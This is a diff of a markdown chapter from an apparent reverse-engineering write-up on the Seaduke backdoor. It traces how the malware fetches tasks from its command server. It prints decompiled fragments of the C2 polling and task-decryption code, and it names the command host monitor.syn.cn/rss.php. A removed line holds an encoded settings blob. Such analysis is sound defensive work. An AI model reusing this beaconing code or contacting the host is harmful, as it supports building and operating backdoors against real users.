@@ -1,30 +1,13 @@
-# how does seaduke fetch instructions from the mothership?
+# fetching instructions from the mothership
 `main()` asks `networkHandleKlass` to get tasks:
 ```python
 def main():
     ...
-    networkTasks=networkHandleKlass.get_tasks()
+    networkTasks = networkHandleKlass.get_tasks()
 
 
 class NetworkHandlerKlass(object):
-    def get_tasks(self):
-        ...
-```
-this instantiates a `CryptoKlass` object called `pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQDy`.
-```python
-class CryptoKlass(object):
-
-    def __init__(self,v_crypto_aes_key,v_crypto_aes_iv,**pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ):
-        if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('b64',True):
-            v_crypto_aes_key=base64_b64decode(v_crypto_aes_key)
-            v_crypto_aes_iv=base64_b64decode(v_crypto_aes_iv)
-        self.__aes_key=v_crypto_aes_key
-        self.__aes_iv=v_crypto_aes_iv
-```
-it then does three inner loops:
-```python
-class NetworkHandlerKlass(object):  # https://github.com/pan-unit42/iocs/blob/29cfa76babf29d1eb754a1706526b5aa97d4607b/seaduke/decompiled.py#L1367
-
+    
     def get_tasks(self):  # https://github.com/pan-unit42/iocs/blob/29cfa76babf29d1eb754a1706526b5aa97d4607b/seaduke/decompiled.py#L1476
         ...
         for _ in range(botKlass.total_hosts):
@@ -32,7 +15,7 @@ class NetworkHandlerKlass(object):  # https://github.com/pan-unit42/iocs/blob/29
                 for _ in range(3):
                     networkTasks=[]
                     try:
-                        response_data = self.__send_request(id=botKlass.bot_id)
+                        response_data = self.__send_request(id=botKlass.bot_id)  # bot_id is unique to bot, randomly generated
                         decoded_response = self.decode_data(response_data)  # pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizDy renamed to decoded_response, decoced response is a dict
                         if not 'tasks' in decoded_response:
                             return []
@@ -41,48 +24,25 @@ class NetworkHandlerKlass(object):  # https://github.com/pan-unit42/iocs/blob/29
                             if 'task_data' in networkTask and networkTask['task_data']:
                                 networkTask['task_data'] = my_cryptoklass.decode_data(networkTask['task_data'])
                                 networkTasks.append(networkTask)
-                        botKlass.is_first_request=False
+                        botKlass.is_first_request = False
                         return networkTasks  # a list of dict
 ```
 ## request information from remote server
 this is a critical part since it is where botKlass requests and receives instructions with `NetworkHandlerKlass.__send_request` method:
 ```python
-response_data=self.__send_request(id=botKlass.bot_id)
-
-class BotKlass(object):
-
-    def __init__(self):
-        self.__settings=self.__load_settings()
-        ...
-        self.__bot_id=self.__settings['bot_id']
-
-
-class NetworkHandlerKlass(object):
+class NetworkHandlerKlass(object):  # https://github.com/pan-unit42/iocs/blob/29cfa76babf29d1eb754a1706526b5aa97d4607b/seaduke/decompiled.py#L1367
     ...
     def __send_request(self, **x):
         url = x.pop('url', self.url)  #  Syntax : dict.pop(key, def) Parameters : key : The key whose key-value pair has to be returned and removed. def : The default value to return if specified key is not present. 
-        encoded_cookie_data = None
-        res = None
-        
-        if x:
-            encoded_cookie_data=self.__encode_cookie(x)
-        
-        if botKlass.current_transport=='wininet':  # windows interface
-            pass
-            p = HttpKlass(url, self.user_agent)
-            res = p.send_request(encoded_cookie_data, self.referer)
+        ...
         else:
-            pass
-            
+            ...
             header = urllib2_build_opener()
-            header.addheaders=[('User-agent',self.user_agent)]
+            header.addheaders=[('User-agent', self.user_agent)]
             
             if encoded_cookie_data:
                 header.addheaders.append(('Cookie', encoded_cookie_data))
-            
-            if self.referer:
-                pass
-
+            ...
             d = header.open(url)
             res = d.read()
             e = d.info().get('Content-Encoding')
@@ -95,14 +55,14 @@ since `NetworkHandlerKlass` wasnt provided with an url, we rely on its url.
 ```python
 class NetworkHandlerKlass(object):
 
-    def __init__(self,**foo):
-        self.__url = foo.get('url', None)
+    def __init__(self,**f):
+        self.__url = f.get('url', None)
 
     @property
     def url(self):
         return self.__url if self.__url else botKlass.current_host
 ```
-since `self.__url=None`, we look at `botKlass.current_host`.
+since `self.__url = None`, we look at `botKlass.current_host`s attribute:
 ```python
 class BotKlass(object):
 
@@ -113,7 +73,7 @@ class BotKlass(object):
     def current_host(self):
         return self.__settings['host_scripts'][self.__current_host_index]
 ```
-`botKlass.current_host` requires `self.__settings` to execute `self.__load_settings()`:
+which means executing `self.__load_settings()`:
 ```python
 class BotKlass(object):
     ...
@@ -137,7 +97,7 @@ class BotKlass(object):
                 d = get_default_settings()
         return d
 ```
-this calls the following for `settings_file_path`, which creates a file path based on the bot's `key_id` (the key_id is defined in `bot_settings`):
+this calls the following for `settings_file_path`, which [creates a file path](https://github.com/mynameisvinn/Seaduke/blob/master/chapters/save.md) based on the bot's `key_id` (the key_id is defined in `bot_settings`):
 ```python
 class BotKlass(object):
     ...
@@ -157,14 +117,14 @@ class BotKlass(object):
             y=a.value
         return os_path.join(y, w)
 ```
-which calls `get_default_settings()`, which returns a [dict called `bot_settings`](https://github.com/mynameisvinn/Seaduke/blob/master/bot_settings.md):
+which calls `get_default_settings()`, which returns a [dict called `bot_settings`](https://github.com/mynameisvinn/Seaduke/blob/master/chapters/bot_settings.md):
 ```python
-bot_settings=json_loads(zlib_decompress(base64_b64decode('eJx1kF1PwjAUhv/K0iuNpiUMg8Fw4QSTAfFrQQ3GNN12Nua2dpyWj0n877ZAvPOqzTnP+77nnD3JCtSG41ryFCrRkoHXufRICa223z0R4F4yDb/i7wVb7NLx1XTUfVf6fRXG4xTvdq1fr0ZRNHub9IP70ldDYvVWxouNUyYVzKdhcVHfvkbTWbf/2Juw+fNwSH4ctjaqUiLlGowpZH7MhB1wKWpw8pnKlZyH1NYOvk3zX8uODwa4yAygbWei0uAylsrupxMsGuPsP8jSmGbAWK1kYRRS3UqaSIZa02bZkE8rQcgADy4HWFt6u93STCQQK1XSRNXMRa41IBc5SOPQqDAQCGQ+9em1dxZYshZYehHgBvDGO+Vqi8UCqcKcnZPjrXmROoenXvCweOm4IkgRV3ab04H+FvoFdgWNdw==')))
+bot_settings=json_loads(zlib_decompress(base64_b64decode('sxxxxx')))
 
 def get_default_settings():
     return bot_settings
 ```
-if we look at the dict `bot_settings` we see the following:
+if we look at the dict `bot_settings` we see the following (for an [in-depth look](https://github.com/mynameisvinn/Seaduke/blob/master/chapters/bot_settings.md):
 ```python
 ```python
 {'first_run_delay': 0,
@@ -176,7 +136,7 @@ if we look at the dict `bot_settings` we see the following:
 'key_id': 'P4BNZR0',
 'enable_autoload': False}
 ```
-since we were interested in:
+since we were interested in `host_scripts`:
 ```python
 class BotKlass(object):
 
@@ -190,7 +150,7 @@ class BotKlass(object):
 we now know `url` points to http://monitor.syn.cn/rss.php.
 
 ## we have the url, now what?
-to refresh, we were evaluating `self.__send_request()`:
+as a reminder, we were evaluating `self.__send_request()`:
 ```python
 class NetworkHandlerKlass(object):
     def get_tasks(self):
@@ -218,4 +178,4 @@ class NetworkHandlerKlass(object):
                 res = CryptoKlass.unpack_data(res,e)
         return res
 ```
-when we ask `NetworkHandlerKlass` to `__send_request`, it will receive some packet from http://monitor.syn.cn/rss.php and decrypt it with `CryptoKlass`.
+when we ask `NetworkHandlerKlass` to `__send_request`, it will receive data from http://monitor.syn.cn/rss.php.
